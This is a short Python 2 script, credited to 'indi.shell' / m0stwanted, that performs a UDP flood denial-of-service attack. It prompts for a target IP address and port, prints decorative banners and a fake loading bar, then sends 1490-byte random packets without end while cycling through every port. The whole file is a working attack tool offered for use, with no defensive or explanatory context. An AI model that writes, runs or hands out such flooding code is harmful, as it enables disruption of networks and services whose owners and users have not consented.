import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


print "\033[1;39;40m______       __  ______  ____        ____               "     
print "\033[1;39;40m  ||  |\  | |  \   ||   /     |   | |     |     |       "    
print "\033[1;39;40m  ||  | \ | |   |  ||   \---\ |===| |===  |     |       "
print "\033[1;39;40m__||__|  \| |__/ __||__ ____/ |   | |____ |____ |____   "


print "\033[1;40mAuthor    : indi.shell\033[1;40m "
print "\033[1;40mGithub    : https://github.com/m0stwanted\033[1;40m "
print "\033[1;40mInstagram : https://www.instagram.com/m0st_.wanted \033[1;40m"
print "\033[1;40mInstagram2: https://www.instagram.com/indi.shell\033[1;40m"
print     
ip = raw_input("[*]Enter Target Ip : ")
port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)
print "[Load.....           ] 45%"
time.sleep(3)
print "[Loading......       ] 55%"
time.sleep(3)
print "[Wait................] 100%"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

#Credit - github.com/m0stwanted
